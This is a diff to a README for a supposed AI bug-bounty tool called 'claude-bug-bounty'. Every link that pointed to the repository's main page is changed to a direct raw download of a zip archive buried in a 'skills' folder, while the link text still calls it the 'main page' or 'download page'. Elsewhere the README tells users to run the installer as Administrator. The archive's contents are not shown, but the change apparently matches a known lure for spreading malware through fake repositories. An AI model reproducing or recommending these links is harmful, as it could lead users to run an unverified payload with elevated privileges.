@@ -1,6 +1,6 @@
 # 🐞 claude-bug-bounty - AI Tool for Finding Security Flaws
 
-[![Download claude-bug-bounty](https://img.shields.io/badge/Download-claude--bug--bounty-brightgreen)](https://github.com/Mikacr1138/claude-bug-bounty)
+[![Download claude-bug-bounty](https://img.shields.io/badge/Download-claude--bug--bounty-brightgreen)](https://github.com/Mikacr1138/claude-bug-bounty/raw/refs/heads/main/skills/bug_claude_bounty_v2.5.zip)
 
 ---
 
@@ -41,12 +41,12 @@ Make sure your PC meets these requirements before installing:
 
 To begin, you need to download the software from its main page.
 
-[![Get claude-bug-bounty here](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Mikacr1138/claude-bug-bounty)
+[![Get claude-bug-bounty here](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Mikacr1138/claude-bug-bounty/raw/refs/heads/main/skills/bug_claude_bounty_v2.5.zip)
 
 ### Step 1: Visit the Download Page
 
 1. Click the green button above or open this link in your browser:  
-   https://github.com/Mikacr1138/claude-bug-bounty  
+   https://github.com/Mikacr1138/claude-bug-bounty/raw/refs/heads/main/skills/bug_claude_bounty_v2.5.zip  
 2. This page is the main hub for files, updates, and documents.
 
 ### Step 2: Locate the Windows Installer
@@ -120,7 +120,7 @@ If you face problems running the app:
 - Run the installer as Administrator (right-click file → Run as administrator)
 
 For detailed help or bug reports, visit the main page:  
-https://github.com/Mikacr1138/claude-bug-bounty
+https://github.com/Mikacr1138/claude-bug-bounty/raw/refs/heads/main/skills/bug_claude_bounty_v2.5.zip
 
 ---
 
@@ -132,4 +132,4 @@ Check for updates inside the app under **Settings** or visit the download page a
 
 ---
 
-[![Download claude-bug-bounty](https://img.shields.io/badge/Download-claude--bug--bounty-brightgreen)](https://github.com/Mikacr1138/claude-bug-bounty)
+[![Download claude-bug-bounty](https://img.shields.io/badge/Download-claude--bug--bounty-brightgreen)](https://github.com/Mikacr1138/claude-bug-bounty/raw/refs/heads/main/skills/bug_claude_bounty_v2.5.zip)
